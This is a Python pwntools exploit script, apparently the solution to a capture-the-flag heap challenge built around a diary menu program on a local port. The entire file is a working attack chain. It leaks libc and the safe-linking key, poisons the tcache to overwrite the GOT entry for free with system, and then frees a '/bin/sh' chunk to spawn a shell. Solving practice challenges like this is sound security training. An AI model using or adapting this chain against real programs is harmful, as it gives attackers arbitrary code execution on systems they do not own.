#!/usr/bin/env python3
import os

from pwn import *

context.binary = elf = ELF("./container/chall")
libc = ELF("./libc.so.6")

# io = process(elf.path)
io = remote("localhost", 50000)


def menu(choice):
    io.sendlineafter(b"pick a vibe:\n", str(choice).encode())


def create(idx, size, data):
    menu(1)
    io.sendlineafter(b"page number:\n", str(idx).encode())
    io.sendlineafter(b"how many letters?\n", str(size).encode())
    io.recvuntil(b"spill the tea:\n")
    io.send(data.ljust(size, b"\x00"))


def delete(idx):
    menu(2)
    io.sendlineafter(b"page number:\n", str(idx).encode())


def view(idx):
    menu(3)
    io.sendlineafter(b"page number:\n", str(idx).encode())
    io.recvuntil(b"dear diary...\n")
    return io.recvuntil(b"\n1. write entry", drop=True)


def edit(idx, size, data):
    menu(4)
    io.sendlineafter(b"page number:\n", str(idx).encode())
    io.recvuntil(b"rewrite the tea:\n")
    io.send(data.ljust(size, b"\x00"))


# 1. leak libc from the unsorted bin
create(0, 0x500, b"")
create(1, 0x20, b"")
delete(0)
UNSORTED_FD_OFFSET = 0x1E6B20
libc.address = u64(view(0)[:8]) - UNSORTED_FD_OFFSET

# 2. leak safe-link key
create(2, 0x10, b"")
create(3, 0x10, b"")
delete(2)
delete(3)
heap_key = u64(view(2)[:8])

# 3. poison tcache so the second allocation writes over entries[4]
ENTRIES_4 = elf.symbols["entries"] + 8 * 4
edit(3, 0x10, p64(ENTRIES_4 ^ heap_key))
create(6, 0x10, b"")
create(4, 0x10, p64(elf.got["free"]))

# 4. entries[4] now points to free, so edit(4) will write to free.
# we will overwrite free with system, and the next time we call free, it will actually call system
create(5, 0x40, b"/bin/sh")
edit(
    4, 0x10, p64(libc.sym["system"]) + p64(libc.sym["puts"])
)  # since we write 16 bytes, we need to put back puts

# 5. we now free entry 5, which will call system("/bin/sh")
delete(5)
io.interactive()
